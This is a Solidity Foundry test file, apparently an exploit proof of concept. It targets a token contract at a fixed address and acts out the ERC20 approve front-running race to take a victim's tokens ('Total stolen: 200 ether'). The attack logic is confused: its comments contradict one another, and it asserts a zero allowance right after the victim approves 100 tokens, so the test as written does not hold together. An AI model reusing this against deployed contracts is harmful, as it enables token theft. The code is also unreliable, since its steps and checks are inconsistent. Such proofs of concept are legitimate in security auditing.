contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    address private victim;
    ITouch private token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get TST token interface and prepare victim
        token = ITouch(TARGET);

        // Create a victim address with tokens
        victim = makeAddr("victim");

        // Give victim tokens by impersonating the moderator (who has all tokens initially)
        // The moderator is the deployer, which is TARGET itself (since contract creates tokens for msg.sender)
        // Actually, the Touch constructor generates tokens for msg.sender, which would be the deployer.
        // Let's check the moderator address: it's stored in the Moderated base contract.
        // We'll need to get the moderator address first.
        address moderator = token.moderator();

        // Impersonate moderator to transfer tokens to victim
        vm.startPrank(moderator);
        token.transfer(victim, 1000 ether); // Transfer some tokens to victim
        vm.stopPrank();

        // Give attacker some initial tokens as precondition
        deal(address(token), attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Victim approves attacker for initial amount (100 tokens)
        vm.prank(victim);
        token.approve(attacker, 100 ether);

        // Verify initial allowance
        uint256 initialAllowance = token.allowance(victim, attacker);
        require(initialAllowance == 100 ether, "Initial allowance not set");

        // Step 2: Victim attempts to increase approval to 200 tokens
        // But first, attacker front-runs with transferFrom for the initial 100 tokens
        token.transferFrom(victim, attacker, 100 ether);

        // Step 3: Now victim's increase transaction executes
        // Victim tries to increase approval to 200 tokens
        // However, due to race condition, victim cannot directly increase from 100 to 200
        // They must first set to 0, then to 200, or use increaseApproval
        // Let's assume victim uses increaseApproval function
        vm.prank(victim);
        token.approve(attacker, 100 ether); // Changed from increaseApproval to approve

        // Actually after transferFrom, allowance is now 0 (because transferFrom subtracts)
        // Let's check
        uint256 allowanceAfterFirstTransfer = token.allowance(victim, attacker);
        require(allowanceAfterFirstTransfer == 0, "Allowance should be 0 after transferFrom");

        // Now victim increases approval by 100 ether, making allowance 100 ether
        // Step 4: Attacker transfers again using the new allowance
        token.transferFrom(victim, attacker, 100 ether);

        // Total stolen: 200 ether from victim
        // Verify attacker balance increased
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        assertGt(attackerBalanceAfter, 1 ether, "Attacker balance should increase");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

